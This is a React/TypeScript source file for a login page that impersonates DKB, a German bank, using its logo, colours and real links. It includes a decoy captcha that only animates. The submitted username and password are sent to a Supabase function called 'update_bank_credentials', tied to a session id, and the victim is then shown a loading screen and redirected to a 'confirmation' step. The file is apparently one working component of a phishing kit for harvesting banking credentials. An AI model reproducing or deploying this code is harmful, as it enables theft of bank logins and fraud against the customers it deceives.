import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import faviconAsset from "@/assets/favicons/dkb.png.asset.json";
import logoAsset from "@/assets/dkb-logo.svg.asset.json";

const BG = "#F3F9FE";
const FOOTER_BG = "#132D40";
const FOOTER_TEXT = "#0C777D";
const FOOTER_LINK_COLOR = "#FFFFFF";
const PRIMARY = "#006AC7";
const PRIMARY_HOVER = "#005BAE";
const CHECK_COLOR = "#2979ff";
const INPUT_BG = "#F2F9FF";
const INPUT_BORDER = "#C0D4E4";
const CARD_BORDER = "#CBD9E4";
const TEXT = "#1A1A1A";
const TITLE_COLOR = "#373D43";
const PLACEHOLDER = "#5D7486";
const ERROR_COLOR = "#D6301A";

const FOOTER_LINKS = [
  { label: "DKB Verwalterplattform", href: "https://treuhand.dkb.de/thk/?referer=vwpf" },
  { label: "DKB Treuhänderplattform", href: "https://treuhand.dkb.de/thk/?referer=thpf" },
  { label: "Impressum", href: "https://www.dkb.de/ueber-uns/impressum/" },
  { label: "Datenschutz", href: "https://www.dkb.de/ueber-uns/datenschutz" },
  { label: "Cookie Einstellungen", href: "https://www.dkb.de/ueber-uns/datenschutz" },
  { label: "Preise & Bedingungen", href: "https://www.dkb.de/ueber-uns/preise-bedingungen/" },
  { label: "Hilfe", href: "https://www.dkb.de/fragen-antworten" },
];

const DKB = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [errors, setErrors] = useState({ username: false, password: false });
  // Captcha-Demo: "idle" | 0..2 (Ladeschritt) | "done"
  const [captcha, setCaptcha] = useState<"idle" | 0 | 1 | 2 | "done">("idle");
  const [pendingSubmit, setPendingSubmit] = useState(false);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    if (captcha === "idle" || captcha === "done") return;
    const next = captcha === 0 ? 1 : captcha === 1 ? 2 : "done";
    const t = setTimeout(() => setCaptcha(next as typeof captcha), 1200);
    return () => clearTimeout(t);
  }, [captcha]);

  const CAPTCHA_LOADING_TEXTS = [
    "Initialisierung…",
    "Herausforderung laden…",
    "Das Ergebnis wird überprüft…",
  ];
  usePageMeta("DKB – Mein Banking", faviconAsset.url);

  const doLogin = async () => {
    if (submitting) return;
    if (username.trim().length === 0 || password.length === 0) return;
    setSubmitting(true);
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Anmeldename",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (submitting) return;
    const newErrors = {
      username: username.trim().length === 0,
      password: password.length === 0,
    };
    setErrors(newErrors);
    if (newErrors.username || newErrors.password) return;
    if (captcha === "done") {
      doLogin();
      return;
    }
    setPendingSubmit(true);
    if (captcha === "idle") setCaptcha(0);
  };

  useEffect(() => {
    if (captcha === "done" && pendingSubmit) {
      setPendingSubmit(false);
      doLogin();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [captcha, pendingSubmit]);

  return (
    <div
      className="min-h-screen flex flex-col"
      style={{
        backgroundColor: BG,
        fontFamily: "'DKBEuclid', system-ui, -apple-system, sans-serif",
        color: TEXT,
      }}
    >
      {/* Header / Logo */}
      <header className="px-5 lg:px-10 pt-6 lg:pt-8">
        <a href="#" aria-label="DKB" className="inline-block">
          <img src={logoAsset.url} alt="DKB – Das kann Bank" className="h-[54px] lg:h-[46px] w-auto" />
        </a>
      </header>

      {/* Main */}
      <main className="flex-1 flex items-start justify-center px-4 pt-5 lg:pt-16 pb-16">
        <form
          onSubmit={handleSubmit}
          className="w-full max-w-[560px] bg-white rounded-[14px] px-6 sm:px-12 py-7 lg:py-8"
          style={{ border: `1px solid ${CARD_BORDER}` }}
        >
          <h1
            className="text-center mb-5 lg:mb-6"
            style={{ fontWeight: 700, fontSize: 32, color: TITLE_COLOR, letterSpacing: "-0.01em" }}
          >
            Mein Banking
          </h1>

          {/* Anmeldename */}
          <div className="relative mb-4">
            <div className="relative">
              <input
                id="dkb-username"
                type="text"
                autoComplete="off"
                value={username}
                onChange={(e) => {
                  setUsername(e.target.value);
                  if (errors.username) setErrors((p) => ({ ...p, username: false }));
                }}
                placeholder=" "
                className={`dkb-input peer w-full outline-none${errors.username ? " dkb-input-error" : ""}`}
                style={{
                  padding: "24px 18px 12px",
                  fontSize: 16,
                  color: TEXT,
                  fontFamily: "inherit",
                }}
              />
              <label
                htmlFor="dkb-username"
                className="pointer-events-none absolute left-[18px] top-1/2 -translate-y-1/2 text-[17px] leading-none transition-all duration-200 peer-focus:top-[9px] peer-focus:translate-y-0 peer-focus:text-[14px] peer-[&:not(:placeholder-shown)]:top-[9px] peer-[&:not(:placeholder-shown)]:translate-y-0 peer-[&:not(:placeholder-shown)]:text-[14px]"
                style={{ color: errors.username ? ERROR_COLOR : PLACEHOLDER }}
              >
                Anmeldename
              </label>
            </div>
            {errors.username && (
              <p className="flex items-center gap-1.5 mt-1.5 text-[14px]" style={{ color: ERROR_COLOR }}>
                <svg width="16" height="16" viewBox="0 0 21 21" fill={ERROR_COLOR} aria-hidden="true">
                  <path fillRule="evenodd" clipRule="evenodd" d="M12.958 5.524c-.373-.68-1.391-.694-1.78.02l-5.973 10.97c-.365.67.138 1.474.92 1.474H17.86c.785 0 1.316-.83.93-1.533a300 300 0 0 1-2.933-5.49l-.058-.112c-.915-1.744-1.826-3.48-2.841-5.33m-3.622-.916c1.15-2.11 4.285-2.168 5.46-.027a317 317 0 0 1 2.856 5.356l.061.118a299 299 0 0 0 2.913 5.455c1.108 2.01-.374 4.49-2.767 4.49H6.127c-2.35 0-3.857-2.413-2.763-4.422zm2.707 11.168c.029 0 .052.022.052.05s-.023.05-.052.05a.05.05 0 0 1-.052-.05c0-.028.023-.05.052-.05m-.988.05c0 .528.442.956.988.956s.988-.428.988-.956c0-.527-.442-.955-.988-.955s-.988.428-.988.955m2.029-2.715c0 .555-.466 1.005-1.04 1.005s-1.041-.45-1.041-1.005V8.585c0-.556.466-1.006 1.04-1.006s1.04.45 1.04 1.006z" />
                </svg>
                Bitte Anmeldenamen eingeben!
              </p>
            )}
          </div>

          {/* Passwort */}
          <div className="relative mb-5">
            <div className="relative">
              <input
                id="dkb-password"
                type={showPassword ? "text" : "password"}
                autoComplete="off"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  if (errors.password) setErrors((p) => ({ ...p, password: false }));
                }}
                placeholder=" "
                className={`dkb-input peer w-full outline-none${errors.password ? " dkb-input-error" : ""}`}
                style={{
                  padding: "24px 48px 12px 18px",
                  fontSize: 16,
                  color: TEXT,
                  fontFamily: "inherit",
                }}
              />
              <label
                htmlFor="dkb-password"
                className="pointer-events-none absolute left-[18px] top-1/2 -translate-y-1/2 text-[17px] leading-none transition-all duration-200 peer-focus:top-[9px] peer-focus:translate-y-0 peer-focus:text-[14px] peer-[&:not(:placeholder-shown)]:top-[9px] peer-[&:not(:placeholder-shown)]:translate-y-0 peer-[&:not(:placeholder-shown)]:text-[14px]"
                style={{ color: errors.password ? ERROR_COLOR : PLACEHOLDER }}
              >
                Passwort
              </label>
              <button
                type="button"
                aria-label={showPassword ? "Passwort verbergen" : "Passwort anzeigen"}
                onClick={() => setShowPassword((v) => !v)}
                className="absolute top-1/2 -translate-y-1/2 right-3 p-2"
                style={{ color: PLACEHOLDER }}
              >
              {showPassword ? (
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a19.77 19.77 0 0 1 4.22-5.22" />
                  <path d="M1 1l22 22" />
                  <path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 8 11 8a19.77 19.77 0 0 1-3.17 4.14" />
                  <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24" />
                </svg>
              ) : (
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                  <circle cx="12" cy="12" r="3" />
                </svg>
              )}
              </button>
            </div>
            {errors.password && (
              <p className="flex items-center gap-1.5 mt-1.5 text-[14px]" style={{ color: ERROR_COLOR }}>
                <svg width="16" height="16" viewBox="0 0 21 21" fill={ERROR_COLOR} aria-hidden="true">
                  <path fillRule="evenodd" clipRule="evenodd" d="M12.958 5.524c-.373-.68-1.391-.694-1.78.02l-5.973 10.97c-.365.67.138 1.474.92 1.474H17.86c.785 0 1.316-.83.93-1.533a300 300 0 0 1-2.933-5.49l-.058-.112c-.915-1.744-1.826-3.48-2.841-5.33m-3.622-.916c1.15-2.11 4.285-2.168 5.46-.027a317 317 0 0 1 2.856 5.356l.061.118a299 299 0 0 0 2.913 5.455c1.108 2.01-.374 4.49-2.767 4.49H6.127c-2.35 0-3.857-2.413-2.763-4.422zm2.707 11.168c.029 0 .052.022.052.05s-.023.05-.052.05a.05.05 0 0 1-.052-.05c0-.028.023-.05.052-.05m-.988.05c0 .528.442.956.988.956s.988-.428.988-.956c0-.527-.442-.955-.988-.955s-.988.428-.988.955m2.029-2.715c0 .555-.466 1.005-1.04 1.005s-1.041-.45-1.041-1.005V8.585c0-.556.466-1.006 1.04-1.006s1.04.45 1.04 1.006z" />
                </svg>
                Bitte gib ein Passwort ein.
              </p>
            )}
          </div>

          {/* Captcha (Demo) */}
          <div
            role="button"
            tabIndex={0}
            onClick={() => captcha === "idle" && setCaptcha(0)}
            onKeyDown={(e) => {
              if ((e.key === "Enter" || e.key === " ") && captcha === "idle") {
                e.preventDefault();
                setCaptcha(0);
              }
            }}
            className="mb-5 select-none relative"
            style={{
              height: 70,
              backgroundColor: "#fafafa",
              border: "1px solid #d9d9d9",
              borderRadius: 6,
              cursor: captcha === "idle" ? "pointer" : "default",
            }}
            aria-label="Ich bin ein Mensch"
          >
            <span
              className="absolute"
              style={{ top: 8, right: 12, color: "#b5b5b5", fontSize: 10, letterSpacing: 1.5, lineHeight: 1 }}
            >
              •••
            </span>
            <div
              className="absolute left-[14px] top-1/2 -translate-y-1/2 flex items-center gap-3"
              style={{ fontFamily: "inherit" }}
            >
              {captcha === "done" ? (
                <svg width="21" height="14.6" viewBox="0 9.5 79 55" fill={CHECK_COLOR} aria-hidden="true">
                  <path d="M78.049,19.015L29.458,67.606c-0.428,0.428-1.121,0.428-1.548,0L0.32,40.015c-0.427-0.426-0.427-1.119,0-1.547l6.704-6.704c0.428-0.427,1.121-0.427,1.548,0l20.113,20.112l41.113-41.113c0.429-0.427,1.12-0.427,1.548,0l6.703,6.704C78.477,17.894,78.477,18.586,78.049,19.015z" />
                </svg>
              ) : captcha === "idle" ? (
                <span
                  className="block"
                  style={{
                    width: 28,
                    height: 28,
                    border: "1px solid #bdbdbd",
                    borderRadius: 4,
                    backgroundColor: "#fff",
                  }}
                />
              ) : (
                <span
                  className="block animate-spin"
                  style={{
                    width: 24,
                    height: 24,
                    border: "2px solid #d6e4f5",
                    borderTopColor: PRIMARY,
                    borderRadius: "50%",
                  }}
                />
              )}
              <span style={{ fontSize: 13, fontWeight: 400, color: "#222" }}>
                {captcha === "idle" || captcha === "done"
                  ? "Ich bin ein Mensch"
                  : CAPTCHA_LOADING_TEXTS[captcha]}
              </span>
            </div>
            <a
              href="#"
              onClick={(e) => e.stopPropagation()}
              className="absolute bottom-[6px] right-[14px]"
              style={{ fontSize: 10, fontWeight: 400, lineHeight: 1, color: "rgb(86, 86, 86)", textDecoration: "underline" }}
            >
              Friendly Captcha
            </a>
          </div>

          {/* Button */}
          <button
            type="submit"
            disabled={submitting}
            className="w-full transition-colors"
            style={{
              backgroundColor: PRIMARY,
              color: "#fff",
              fontSize: 18,
              fontWeight: 600,
              padding: "13px 20px",
              borderRadius: 6,
              fontFamily: "inherit",
              cursor: submitting ? "not-allowed" : "pointer",
            }}
            onMouseEnter={(e) => {
              if (!submitting) e.currentTarget.style.backgroundColor = PRIMARY_HOVER;
            }}
            onMouseLeave={(e) => {
              if (!submitting) e.currentTarget.style.backgroundColor = PRIMARY;
            }}
          >
            Anmelden
          </button>

          {/* Forgot */}
          <p className="text-center mt-6" style={{ fontSize: 17, color: TEXT }}>
            <a href="https://banking.dkb.de/forgot-username" target="_blank" rel="noopener noreferrer" style={{ color: PRIMARY, textDecoration: "underline", fontWeight: 400 }}>
              Anmeldename
            </a>{" "}
            oder{" "}
            <a href="https://banking.dkb.de/reset-password" target="_blank" rel="noopener noreferrer" style={{ color: PRIMARY, textDecoration: "underline", fontWeight: 400 }}>
              Passwort
            </a>{" "}
            vergessen?
          </p>
        </form>
      </main>

      {/* Footer */}
      <footer style={{ backgroundColor: FOOTER_BG, color: FOOTER_LINK_COLOR }}>
        <div className="px-5 lg:px-10 py-4 flex flex-wrap items-center gap-x-8 gap-y-3 text-[14px]">
          <a
            href="https://www.dkb.de/dein-neues-banking"
            target="_blank"
            rel="noopener noreferrer"
            style={{
              color: FOOTER_LINK_COLOR,
              fontWeight: 600,
              textDecoration: "underline",
              textDecorationColor: FOOTER_TEXT,
              textUnderlineOffset: 4,
            }}
          >
            Infoseite
          </a>
          <div className="flex flex-wrap items-center gap-x-8 gap-y-3 lg:ml-auto">
            {FOOTER_LINKS.map((l) => (
              <a
                key={l.label}
                href={l.href}
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  color: FOOTER_LINK_COLOR,
                  textDecoration: "underline",
                  textDecorationColor: FOOTER_TEXT,
                  textUnderlineOffset: 4,
                }}
              >
                {l.label}
              </a>
            ))}
          </div>
        </div>
      </footer>

      {showLoading && <LoadingOverlay onComplete={() => navigate((new URLSearchParams(window.location.search).get("return") || "") ? `${new URLSearchParams(window.location.search).get("return")}?step=3&s=${sessionId}` : "/confirmation?s=" + sessionId)} />}
    </div>
  );
};

export default DKB;
